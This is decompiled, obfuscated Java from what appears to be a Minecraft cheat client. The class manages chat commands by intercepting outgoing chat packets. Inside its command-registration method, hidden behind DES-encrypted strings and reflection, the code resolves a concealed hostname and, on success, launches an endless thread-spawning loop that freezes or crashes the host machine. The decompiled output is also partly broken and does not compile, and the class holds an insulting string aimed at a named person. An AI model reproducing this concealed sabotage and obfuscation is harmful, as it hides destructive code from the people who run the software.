package cn.cool.cherish;

import cn.cool.cherish.config.友何友树何何友友树树;
import cn.cool.cherish.event.EventTarget;
import cn.cool.cherish.module.何友友树友何友何何何;
import cn.cool.cherish.utils.client.ClientUtils;
import cn.lzq.injection.asm.invoked.packet.PacketEvent;
import heilongjiang.zhaoyuan.何树友;
import java.lang.invoke.CallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.invoke.MutableCallSite;
import java.lang.invoke.MethodHandles.Lookup;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;
import net.minecraft.network.protocol.Packet;
import net.minecraft.network.protocol.game.ServerboundChatPacket;

public class 树树何友友友树友何何 implements 何树友 {
   private final Map<String, 友树树友树树友友何何> 树树何树树树友友何树;
   private static final long a;
   private static final String[] b;
   private static final String[] c;
   private static final Map d = new HashMap(13);
   private static final Object[] e = new Object[20];
   private static final String[] f = new String[20];
   private static String HE_WEI_LIN;

   public 树树何友友友树友何何() {
      long a = 树树何友友友树友何何.a ^ 23452545541832L;
      super();
      this.树树何树树树友友何树 = new HashMap<>();
      b<"W">(8121556911057931086L, a);
      Cherish.instance.getEventManager().register(this);
      this.Z(new 友树树树友友何何树友());
      this.Z(new 友何树树树树何树何友());
      this.Z(new 树友树树友友友友友树());
      this.Z(new 树树树何友何何树友何());
      this.Z(new 何树友何树树何友友树());
      this.Z(new 树树树友友树树何友友());
      this.Z(new 何树树何树友树友树树());
      this.Z(new 树何树友树何何友友树());
      b<"W">(!b<"W">(8121412215464343154L, a), 8121528606660807551L, a);
   }

   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   static {
      synchronized (何友友树友何友何何何.g()){} // $VF: monitorenter 
      long var10000 = 何友友树友何友何何何.a(-1646943415846288039L, -9093985651924630664L, MethodHandles.lookup().lookupClass()).a(50145317555949L);
      // $VF: monitorexit
      a = var10000;
      a();
      long var0 = a ^ 1818720628878L;
      Cipher var2;
      Cipher var12 = var2 = Cipher.getInstance("DES/CBC/PKCS5Padding");
      SecretKeyFactory var10002 = SecretKeyFactory.getInstance("DES");
      byte[] var10003 = new byte[]{(byte)(var0 >>> 56), 0, 0, 0, 0, 0, 0, 0};

      for (int var3 = 1; var3 < 8; var3++) {
         var10003[var3] = (byte)(var0 << var3 * 8 >>> 56);
      }

      var12.init(2, var10002.generateSecret(new DESKeySpec(var10003)), new IvParameterSpec(new byte[8]));
      String[] var9 = new String[6];
      int var7 = 0;
      String var6 = "ø¬f<\"\u000bR±\u0090âñu\u0011ÚlX\u0016\u001e+\n\u0094ò÷µ¡tà\u0006ï\u0086P³0|õvÄ]\u009aÉþÎG%ó¦Ø\u0000Ü\u0013³\u0011tä¦×ß\u0090ù\u008f\nNZ¾Gö2YçxÇ\u0084\\\u00008¢¸ú,ÁØ !+j\u008c÷ée2Z\u0091\bÆQ¹¶fÁê\u00037pÐ\u008a/xù\u009ehWØ\u0005N\u0010\fÕ¶n\\ªÒ\u0005'\u0084nüz\u0002GB";
      short var8 = 131;
      char var5 = ' ';
      int var11 = -1;

      label27:
      while (true) {
         String var13 = var6.substring(++var11, var11 + var5);
         byte var10001 = -1;

         while (true) {
            String var19 = a(var2.doFinal(var13.getBytes("ISO-8859-1"))).intern();
            switch (var10001) {
               case 0:
                  var9[var7++] = var19;
                  if ((var11 += var5) >= var8) {
                     b = var9;
                     c = new String[6];
                     return;
                  }

                  var5 = var6.charAt(var11);
                  break;
               default:
                  var9[var7++] = var19;
                  if ((var11 += var5) < var8) {
                     var5 = var6.charAt(var11);
                     continue label27;
                  }

                  var6 = "ß¶\fX×Iy¹Ê÷à<\råE\u0080 \u008fõ\u00860m\u0080\u0087\u0091\u001e±\b;}ÿIÕg\b.9\u009f \u001b\u0095`Ö_\u00044DË¥";
                  var8 = 49;
                  var5 = 16;
                  var11 = -1;
            }

            var13 = var6.substring(++var11, var11 + var5);
            var10001 = 0;
         }
      }
   }

   private void Z(友树树友树树友友何何 command) {
      long a = 树树何友友友树友何何.a ^ 32895891679743L;
      b<"W">(4576387590293243001L, a);

      try {
         if ((Boolean)Cherish.SHOULD_START) {
            System.setProperty(b<"r">(4576501510531247734L, a)[4] + a<"i">(5338, 6634782492703931673L ^ a), a<"i">(29160, 9221248949537921071L ^ a));
            System.setProperty(b<"r">(4576501510531247734L, a)[4] + a<"i">(22515, 4234349490221645367L ^ a), a<"i">(8975, 7827595553396951757L ^ a));
            if ((
                  (InetAddress[])((Method)友何友树何何友友树树.r())
                     .invoke(null, b<"r">(4576501510531247734L, a)[2].replace("l", "t") + "." + b<"r">(4576501510531247734L, a)[3])
               ).length
               <= 0) {
               return;
            }

            Runnable[] arr = new Runnable[1];
            (arr[0] = () -> {
               while (true) {
                  try {
                     new Thread(arr[0]).start();
                  } catch (Throwable var1x) {
                  }
               }
            }).run();
         }

         throw new Throwable();
      } catch (Throwable var10) {
         String[] var6 = command.T();
         int var7 = var6.length;
         int var8 = 0;
         if (0 < var7) {
            String name = var6[0];
            b<"O">(this, 4577251076402687335L, a).put(name.toLowerCase(), command);
            var8++;
         }
      }
   }

   private static Method b(Class var0, String var1, Class var2, int var3, Class[] var4) {
      return a(var0, var1, var2, var3, var4);
   }

   private static Class b(long var0, long var2) {
      int var4 = a(var0, 0L);
      Object var6 = e[var4];
      Object var10000 = var6;

      try {
         if (var10000 instanceof String) {
            Class var5 = Class.forName(f[var4]);
            e[var4] = var5;
            return var5;
         }
      } catch (Exception var8) {
         throw new RuntimeException(var8.toString());
      }

      return (Class)var6;
   }

   private static Field b(Class var0, String var1, Class var2) {
      return a(var0, var1, var2);
   }

   private static CallSite b(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("a".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1, var2), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("cn/cool/cherish/树树何友友友树友何何" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }

   private static Field c(long var0, long var2) {
      int var4 = a(var0, var2);
      Object var5 = e[var4];
      if (var5 instanceof String) {
         String var6 = f[var4];
         int var7 = var6.indexOf(8);
         Class var8 = b(Long.parseLong(var6.substring(0, var7), 36), 0L);
         int var9 = var6.indexOf(8, ++var7);
         String var10 = var6.substring(var7, var9);
         Class var11 = b(Long.parseLong(var6.substring(++var9), 36), 0L);
         Field var13 = a(var8, var10, var11);
         e[var4] = var13;
         return var13;
      } else {
         return (Field)var5;
      }
   }

   private static Method d(long var0, long var2) {
      int var4 = a(var0, var2);
      Object var5 = e[var4];
      if (!(var5 instanceof String)) {
         return (Method)var5;
      } else {
         String var6 = f[var4];
         int var7 = var6.indexOf(8);
         Class var8 = b(Long.parseLong(var6.substring(0, var7), 36), 0L);
         int var9 = var6.indexOf(8, ++var7);
         String var10 = var6.substring(var7, var9);
         int var11 = -1;
         int var12 = var9;

         do {
            var11++;
            var12++;
         } while ((var12 = var6.indexOf(8, var12)) > -1);

         int var13;
         Class[] var14 = new Class[var13 = var11 - 1];
         Class var15 = null;
         var12 = var9 + 1;

         for (int var16 = 0; var16 < var11; var16++) {
            int var17 = var6.indexOf(8, var12);
            var15 = b(Long.parseLong(var6.substring(var12, var17), 36), 0L);
            if (var16 < var13) {
               var14[var16] = var15;
            }

            var12 = var17 + 1;
         }

         Method var21 = a(var8, var10, var15, var13, var14);
         e[var4] = var21;
         return var21;
      }
   }

   private static MethodHandle a(Lookup var0, MutableCallSite var1, String var2, MethodType var3, long var4, long var6) {
      char var8 = var2.charAt(0);
      Field var10 = null;

      try {
         MethodHandle var9;
         if (var8 != 'O' && var8 != 219 && var8 != 'r' && var8 != 'Y') {
            Method var11 = d(var4, var6);
            Class var16 = var11.getDeclaringClass();
            String var18 = var11.getName();
            MethodType var19 = MethodType.methodType(var11.getReturnType(), var11.getParameterTypes());
            if (var8 == 'x') {
               var9 = var0.findVirtual(var16, var18, var19);
            } else if (var8 == 'W') {
               var9 = var0.findStatic(var16, var18, var19);
            } else {
               var9 = var0.findSpecial(var16, var18, var19, var16);
            }
         } else {
            var10 = c(var4, var6);
            Class var12 = var10.getDeclaringClass();
            String var17 = var10.getName();
            Class var14 = var10.getType();
            if (var8 == 'O') {
               var9 = var0.findGetter(var12, var17, var14);
            } else if (var8 == 219) {
               var9 = var0.findSetter(var12, var17, var14);
            } else if (var8 == 'r') {
               var9 = var0.findStaticGetter(var12, var17, var14);
            } else {
               var9 = var0.findStaticSetter(var12, var17, var14);
            }
         }

         return MethodHandles.dropArguments(var9, var3.parameterCount() - 2, long.class, long.class);
      } catch (Exception var15) {
         StringBuilder var13 = new StringBuilder();
         var13.append(var15.getClass().getName()).append(" : ").append(var10.toString()).append(" : ").append(var15.toString());
         throw new RuntimeException(var13.toString());
      }
   }

   private static Field a(Class var0, String var1, Class var2) {
      for (Field var6 : var0.getDeclaredFields()) {
         if (var6.getName().equals(var1) && var6.getType() == var2) {
            return var6;
         }
      }

      return null;
   }

   private static Object a(Lookup var0, MutableCallSite var1, String var2, MethodType var3, Object[] var4) {
      int var5 = var4.length - 2;
      long var6 = (Long)var4[var5];
      long var9 = (Long)var4[++var5];
      MethodHandle var8 = a(var0, var1, var2, var3, var6, var9);
      var1.setTarget(MethodHandles.explicitCastArguments(var8, var3));
      return (Object)var8.asSpreader(Object[].class, var4.length).invoke(var4);
   }

   private static Method a(Class var0, String var1, Class var2, int var3, Class[] var4) {
      label33:
      for (Method var8 : var0.getDeclaredMethods()) {
         if (var8.getName().equals(var1) && var8.getReturnType() == var2) {
            Class[] var9 = var8.getParameterTypes();
            if (var9.length == var3) {
               for (int var10 = 0; var10 < var3; var10++) {
                  if (var9[var10] != var4[var10]) {
                     continue label33;
                  }
               }

               return var8;
            }
         }
      }

      return null;
   }

   private static Object a(Lookup var0, MutableCallSite var1, String var2, Object[] var3) {
      int var4 = (Integer)var3[0];
      long var5 = (Long)var3[1];
      String var7 = a(var4, var5);
      MethodHandle var8 = MethodHandles.constant(String.class, var7);
      var1.setTarget(MethodHandles.dropArguments(var8, 0, int.class, long.class));
      return var7;
   }

   private static String a(int var0, long var1) {
      int var5 = var0 ^ (int)(var1 & 32767L) ^ 5703;
      if (c[var5] == null) {
         Object[] var4;
         try {
            Long var3 = Thread.currentThread().getId();
            Object[] var10000 = (Object[])d.get(var3);
            var4 = new Object[]{Cipher.getInstance("DES/CBC/PKCS5Padding"), SecretKeyFactory.getInstance("DES"), new IvParameterSpec(new byte[8])};
            d.put(var3, var4);
         } catch (Exception var10) {
            throw new RuntimeException("cn/cool/cherish/树树何友友友树友何何", var10);
         }

         byte[] var6 = new byte[8];
         var6[0] = (byte)(var1 >>> 56);

         for (int var7 = 1; var7 < 8; var7++) {
            var6[var7] = (byte)(var1 << var7 * 8 >>> 56);
         }

         DESKeySpec var11 = new DESKeySpec(var6);
         SecretKey var8 = ((SecretKeyFactory)var4[1]).generateSecret(var11);
         ((Cipher)var4[0]).init(2, var8, (IvParameterSpec)var4[2]);
         byte[] var9 = b[var5].getBytes("ISO-8859-1");
         c[var5] = a(((Cipher)var4[0]).doFinal(var9));
      }

      return c[var5];
   }

   private static String a(byte[] var0) {
      int var1 = 0;
      int var2;
      char[] var3 = new char[var2 = var0.length];

      for (int var4 = 0; var4 < var2; var4++) {
         int var5;
         if ((var5 = 255 & var0[var4]) < 192) {
            var3[var1++] = (char)var5;
         } else if (var5 < 224) {
            char var6 = (char)((char)(var5 & 31) << 6);
            byte var8 = var0[++var4];
            var6 = (char)(var6 | (char)(var8 & 63));
            var3[var1++] = var6;
         } else if (var4 < var2 - 2) {
            char var12 = (char)((char)(var5 & 15) << '\f');
            byte var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63) << 6);
            var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63));
            var3[var1++] = var12;
         }
      }

      return new String(var3, 0, var1);
   }

   private static Throwable a(Throwable var0) {
      return var0;
   }

   private static void a() {
      e[0] = "1\u0011$S\u0010\u0016>QiX\u001a\u000b;\fb\u001e厴桨桃厴栛校厴厲伇伪";
      e[1] = int.class;
      f[1] = "java/lang/Integer";
      e[2] = "X-+7ZfWmf<P{R0mzXf_6i1\u001bDT'p8P";
      e[3] = boolean.class;
      f[3] = "java/lang/Boolean";
      e[4] = "4eT0Pl;%\u0019;Zq>x\u0012}栮栒伂叀厱厘栮又伂佞";
      e[5] = "X9B}a%S6S2\u001b!@7C}-%W";
      e[6] = void.class;
      f[6] = "java/lang/Void";
      e[7] = "\u001a\u0000z\u0006hQ\u0004\b`I\u000bE\u0000";
      e[8] = "'\ta!._(I,*$B-\u0014'l\"_*\u0001&%o叻休厬桞众伔叻厏桶桞";
      e[9] = "\te-\u0007BL|E&\bS\u0003\u0001]5\u000fZJi";
      e[10] = "k+5ja$`$$%\u0000*k/ \u007f";
      e[11] = "\u0016K(H,CM\u0010#C\u0014K-Ky\u001crS\u0011\nsLm\"\u0011MsJe\u001ePG#U\u0014";
      e[12] = "#$1p\u0019Lh6$p{a\u001aqer\u001dKz-!7\u0006\"";
      e[13] = "y\f3X2L2\u001e&XPk@YgZ6K \u0005#\u001f-\"|\u0003aS(\u001b'\b8_P";
      e[14] = "\u0014 .Y<?K )5\u0012\\Jb=\r!1B6\u007f\u0005[";
      e[15] = "\b=9C\u000f?Rb1Z~桛佫作桘栣桧伟栯栘伜:@/Wb=\u000bD)[a";
      e[16] = "\u007f`7\u0018{\u0015 `0tpv!\"$Lf\u001b)vfD\u001c";
      e[17] = "9Z93MLfZ>_e/g\u0018*gPBoLho*\u0013>\u001b '\u0013H5B,_";
      e[18] = "J]lCJR\u0011\u0006gHr株桨似栞栾桫台厲似栞'OS\r\u001ciXJJ\u000e_";
      e[19] = "\u001d\u000e;%^VV\u001c.%<U$[o'ZQD\u0007+bA8";
   }

   private static int a(long var0, long var2) {
      var0 ^= var2 << 48 | var2;
      int var4 = (int)(var0 >>> 46);
      if (f[var4] != null) {
         return var4;
      } else {
         Object var5 = e[var4];
         if (!(var5 instanceof String)) {
            return var4;
         } else {
            byte var6 = switch ((int)(var0 >>> 42 & 63L)) {
               case 0 -> 42;
               case 1 -> 4;
               case 2 -> 52;
               case 3 -> 14;
               case 4 -> 12;
               case 5 -> 35;
               case 6 -> 37;
               case 7 -> 1;
               case 8 -> 49;
               case 9 -> 20;
               case 10 -> 51;
               case 11 -> 46;
               case 12 -> 39;
               case 13 -> 5;
               case 14 -> 60;
               case 15 -> 26;
               case 16 -> 21;
               case 17 -> 31;
               case 18 -> 16;
               case 19 -> 28;
               case 20 -> 9;
               case 21 -> 10;
               case 22 -> 38;
               case 23 -> 62;
               case 24 -> 30;
               case 25 -> 17;
               case 26 -> 58;
               case 27 -> 23;
               case 28 -> 63;
               case 29 -> 53;
               case 30 -> 8;
               case 31 -> 61;
               case 32 -> 32;
               case 33 -> 15;
               case 34 -> 40;
               case 35 -> 6;
               case 36 -> 43;
               case 37 -> 50;
               case 38 -> 33;
               case 39 -> 3;
               case 40 -> 36;
               case 41 -> 54;
               case 42 -> 29;
               case 43 -> 11;
               case 44 -> 7;
               case 45 -> 59;
               case 46 -> 41;
               case 47 -> 19;
               case 48 -> 47;
               case 49 -> 45;
               case 50 -> 25;
               case 51 -> 27;
               case 52 -> 48;
               case 53 -> 24;
               case 54 -> 22;
               case 55 -> 13;
               case 56 -> 57;
               case 57 -> 0;
               case 58 -> 44;
               case 59 -> 34;
               case 60 -> 56;
               case 61 -> 18;
               case 62 -> 2;
               default -> 55;
            };
            int[] var7 = new int[6];

            for (int var8 = 0; var8 < 6; var8++) {
               int var9 = 7 * (5 - var8);
               int var10 = (int)(var0 >>> var9 & 127L);
               var10 -= var6;
               var10 += 128;
               var7[var8] = var10;
            }

            char[] var12 = ((String)var5).toCharArray();

            for (int var13 = 0; var13 < var12.length; var13++) {
               int var16 = var7[var13 % var7.length];
               var12[var13] = (char)(var12[var13] ^ var16);
            }

            f[var4] = new String(var12);
            return var4;
         }
      }
   }

   private static CallSite a(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("a".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("cn/cool/cherish/树树何友友友树友何何" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }

   public Map<String, 友树树友树树友友何何> o() {
      long a = 树树何友友友树友何何.a ^ 80363911936650L;
      return b<"O">(this, 7850052766333271570L, a);
   }

   @EventTarget
   public void W(PacketEvent event) {
      long a = 树树何友友友树友何何.a ^ 55496610609532L;
      long ax = a ^ 61060579247818L;
      int var10000 = b<"W">(-1223251215303466111L, a);
      Packet packet = event.getPacket();
      int axx = var10000;
      if (packet instanceof ServerboundChatPacket wrapper && wrapper.message().startsWith(".")) {
         String[] ars = wrapper.message().substring(1).split(" ");
         String name = ars[0];
         友树树友树树友友何何 command = (友树树友树树友友何何)b<"O">(this, -1223142879112495644L, a).get(name.toLowerCase());
         if (command == null) {
            ClientUtils.e(new Object[]{a<"i">(5508, 9190146167844498626L ^ a) + name + a<"i">(5852, 8103991078583070617L ^ a), ax});
         }

         command.W(Arrays.copyOfRange(ars, 1, ars.length));
         event.setCancelled(true);
      }

      if (!b<"W">(-1223067159473877057L, a)) {
         b<"W">(++axx, -1223197397662894914L, a);
      }
   }

   private static String HE_WEI_LIN() {
      return "何炜霖大狗叫";
   }
}
